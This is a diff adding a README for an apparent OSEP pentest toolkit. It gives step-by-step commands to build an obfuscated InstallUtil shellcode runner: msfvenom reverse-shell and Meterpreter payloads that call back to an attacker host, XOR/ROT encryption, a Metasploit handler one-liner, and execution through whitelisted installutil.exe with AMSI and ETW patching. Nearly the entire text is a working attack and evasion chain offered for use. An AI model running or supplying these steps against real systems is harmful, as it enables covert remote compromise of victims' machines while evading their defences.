@@ -1,0 +1,35 @@
+# OSEP InstallUtil Shellcode Runner (Surgical Edition)
+
+This version uses "Surgical Reflection" to hide Win32 API calls from the IAT and includes automated XOR+ROT encryption for the shellcode.
+
+### STEP 1: Generate Shellcode
+Generate your payload in raw format (.bin). Use a stageless meterpreter over HTTP/S for better AV evasion:
+
+# Example 1: Simple Reverse TCP (Highly Signatured)
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shellcode.bin
+
+# Example 2: Meterpreter Reverse HTTP (Stealthier)
+$ msfvenom -p windows/x64/meterpreter/reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o shellcode.bin
+
+### STEP 2: Compile
+Use the PayloadCompiler with the --shellcode flag. This will automatically encrypt the .bin and inject it into the C# template.
+
+$ python3 /home/kali/OSEP-TOOLS/PayloadCompiler/PayloadCompiler.py \
+    -p /home/kali/OSEP-TOOLS/Helpers/InstallUtilBypass/ShellcodeRunner/InstallUtil-Shellcode.cs \
+    -m classic \
+    --obfuscate aggressive \
+    --shellcode shellcode.bin \
+    -o ShellcodeRunner.exe
+
+### STEP 3: Setup the Handler (On Kali)
+Use this one-liner to start the listener for the Meterpreter Reverse HTTP payload:
+
+$ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_http; set LHOST <IP>; set LPORT <PORT>; set EXITONSESSION false; exploit -j"
+
+### STEP 4: Execute on Target
+Transfer ShellcodeRunner.exe to the target and execute via the whitelisted installutil.exe:
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U ShellcodeRunner.exe
+
+---
+NOTE: The /U flag triggers the Uninstall method where our payload resides. StealthInit() will automatically patch AMSI and ETW before execution.
